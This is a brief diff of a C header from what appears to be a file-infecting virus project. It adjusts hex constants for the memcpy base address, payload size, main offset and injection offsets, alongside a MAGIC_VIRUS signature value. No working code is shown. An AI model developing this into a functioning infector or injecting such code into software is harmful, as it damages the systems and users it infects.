@@ -15,17 +15,17 @@
 # define MAGIC_VIRUS 0x4E505241
 # define SIGN_SIZE 0x28
 
-# define FT_MEMCPY_ADDR 0x11C0
+# define FT_MEMCPY_ADDR 0x11F0
 # define BUF_SIZE 0x20
 # define END_SIZE 0x5B
 # define LOADER_SIZE 0x57
-# define PAYLOAD_SIZE 0x2351 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x22e1 - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x232b - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x22bb - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
 # define OFFSET_1 0x1b2a - FT_MEMCPY_ADDR
 # define OFFSET_2 0x1c4f - FT_MEMCPY_ADDR
-# define OFFSET_3 0x1d9a - FT_MEMCPY_ADDR
+# define OFFSET_3 0x1d74 - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
